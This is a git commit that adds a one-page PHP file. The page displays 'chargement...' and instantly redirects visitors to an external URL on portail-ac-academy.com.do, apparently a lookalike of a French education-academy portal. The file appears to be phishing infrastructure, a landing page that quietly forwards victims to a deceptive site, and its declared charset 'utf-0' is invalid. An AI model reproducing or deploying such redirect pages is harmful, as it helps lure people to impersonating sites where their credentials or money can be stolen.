1c47d728c0b6b160eec3406f9815d18716bdfc46
infenro <122764730+infenro@users.noreply.github.com>
2023-01-15 19:23:50 -0800

    Add files via upload

---
+++ index.php
@@ -0,0 +1,19 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+<meta charset=utf-0/>
+  <title>chargement...</title>
+</head>
+
+<body>
+
+<?php
+   echo("chargement...")     ;
+ echo "<META HTTP-EQUIV='Refresh' Content=0;URL='https://portail-ac-academy.com.do/r/Cf9VoV1'>";
+?>
+
+
+</body>
+</html>
